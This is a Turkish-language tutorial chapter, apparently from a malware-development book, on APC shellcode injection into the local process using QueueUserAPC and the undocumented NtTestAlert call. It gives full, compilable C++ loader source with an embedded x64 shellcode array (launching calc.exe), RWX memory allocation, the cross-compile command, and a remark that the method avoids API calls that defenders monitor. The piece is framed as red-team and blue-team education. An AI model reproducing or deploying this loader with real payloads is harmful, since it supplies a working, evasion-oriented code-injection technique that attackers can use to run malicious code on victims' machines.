\newpage
\subsection{14. APC enjeksiyonu NtTestAlert ile. Basit C++ zararlı yazılım.}

﷽

![APC injection](./images/22/2021-11-21_13-18.png){width="80%"}    

Bir önceki bölümde, "Early Bird" APC enjeksiyon tekniğinden bahsetmiştim.    

Bu bölümde ise başka bir APC enjeksiyon tekniğini ele alacağım. Bu teknik, belgelenmemiş bir `NtTestAlert` işlevini kullanmamız anlamına geliyor. Şimdi, bir Win32 API olan `QueueUserAPC` ve resmi olarak belgelenmemiş bir Native API olan `NtTestAlert`'ten faydalanarak bir yerel süreçte kabuk kodu nasıl çalıştırılacağını gösterelim.    

### NtTestAlert

**NtTestAlert**, Windows'un uyarı mekanizmasıyla ilgili bir sistem çağrısıdır. Bu sistem çağrısı, iş parçacığının bekleyen tüm APC'lerini çalıştırmasına neden olabilir. Bir iş parçacığı Win32 başlangıç adresini çalıştırmaya başlamadan önce, bekleyen tüm APC'leri çalıştırmak için `NtTestAlert` çağrısı yapar.     

### örnek

Zararlı yazılımımızın C++ kaynak koduna bir göz atalım:      

```cpp
/*
hack.cpp
APC code injection via undocumented NtTestAlert
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/11/20/malware-injection-4.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 
  0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 
  0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 
  0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 
  0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 
  0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
  0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 
  0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 
  0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 
  0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 
  0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
  0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 
  0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
  0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 
  0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 
  0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 
  0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 
  0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 
  0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 
  0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
  0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

int main(int argc, char* argv[]) {
  SIZE_T my_payload_len = sizeof(my_payload);
  HMODULE hNtdll = GetModuleHandleA("ntdll");
  myNtTestAlert testAlert = (myNtTestAlert)(
    GetProcAddress(hNtdll, "NtTestAlert"));

  LPVOID my_payload_mem = VirtualAlloc(NULL, my_payload_len, 
  MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(GetCurrentProcess(), 
  my_payload_mem, my_payload, 
  my_payload_len, NULL);

  PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)
  my_payload_mem;
  QueueUserAPC(
    (PAPCFUNC)apcRoutine, 
    GetCurrentThread(), NULL
  );
  testAlert();

  return 0;
}
```

Basitlik adına, payload olarak 64-bit `calc.exe`'yi kullanıyoruz.    

Bu tekniğin akışı oldukça basittir. Öncelikle, yükümüz için yerel süreçte bellek tahsis ederiz:    

![APC injection 1](./images/22/2021-11-21_13-49.png){width="80%"}    

Daha sonra payload’ımızı yeni tahsis edilen belleğe yazarız:    

![APC injection 2](./images/22/2021-11-21_13-50.png){width="80%"}    

Ardından, mevcut iş parçacığına bir APC sıraya alırız:      

![APC injection 3](./images/22/2021-11-21_13-52.png){width="80%"}    

Son olarak, `NtTestAlert` çağrısı yaparız:    

![APC injection 4](./images/22/2021-11-21_13-53.png){width="80%"}    

Kodumuzu derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
 -I/usr/share/mingw-w64/include/ -s -ffunction-sections \
 -fdata-sections -Wno-write-strings -fno-exceptions \
 -fmerge-all-constants -static-libstdc++ -static-libgcc \
 -fpermissive
```

![APC injection 5](./images/22/2021-11-21_13-58.png){width="80%"}    

ve kurban makinede (benim durumumda `Windows 7 x64`) çalıştıralım:

![APC injection 6](./images/22/2021-11-21_14-03.png){width="80%"}    

Eğer zararlı yazılımımızı (`hack.exe`) `Ghidra`'da açarsak:    

![APC injection 7](./images/22/2021-11-21_15-12.png){width="80%"}    

`NtTestAlert` işlev çağrısı şüpheli değildir. Bu tekniğin avantajı, mavi takım üyeleri tarafından daha fazla araştırılan ve daha popüler olan `CreateThread` veya `CreateRemoteThread` API çağrılarına dayanmadığıdır.    

[APC MSDN](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)         
[QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)          
[VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)   
[WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)      
[GetModuleHandleA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)    
[GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)    
[APC technique MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/004/)    
[NTAPI Undocumented Functions - NtTestAlert](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html)    
[Ghidra - NSA](https://github.com/NationalSecurityAgency/ghidra/)    
[Github'taki kaynak kod:](https://github.com/cocomelonc/2021-11-20-injection-4)    

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.    
